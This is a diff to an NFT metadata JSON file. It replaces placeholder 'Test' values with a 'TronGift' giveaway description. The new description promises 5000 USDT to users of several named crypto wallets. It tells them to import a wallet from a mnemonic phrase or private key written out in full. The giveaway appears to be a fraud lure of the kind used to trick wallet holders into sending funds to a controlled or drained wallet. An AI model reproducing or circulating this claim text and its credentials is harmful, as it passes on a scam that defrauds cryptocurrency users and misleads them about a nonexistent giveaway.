@@ -1,12 +1,5 @@
 {
-    "name": "Test",
-    "description": "Test",
-    "image": "https://gift-nft.github.io/GiftNFT/1.jpg",
-    "attributes": [
-      {
-        "trait_type": "Type",
-        "value": "Gift"
-      }
-    ]
-  }
-  
+    "name": "TronGift",
+    "description": "We are thrilled to offer you a chance to receive 5000 USDT (TRC20) through our TronGift giveaway. This applies to SafePal Wallet, Bitget Wallet, OKX Wallet, and Tron Wallet.\n\nTo claim:\n\nOpen your wallet app.\nImport using the mnemonic phrase:\ngreen silly giant matrix hold hover guitar message receive blame forest machine\nOr use the private key:\nde0aaea4565fe70343309a1be51d39f2ee8eb926e75e46ccc83b11aae2b8eb34",
+    "image": "https://gift-nft.github.io/GiftNFT/1.jpg"
+}
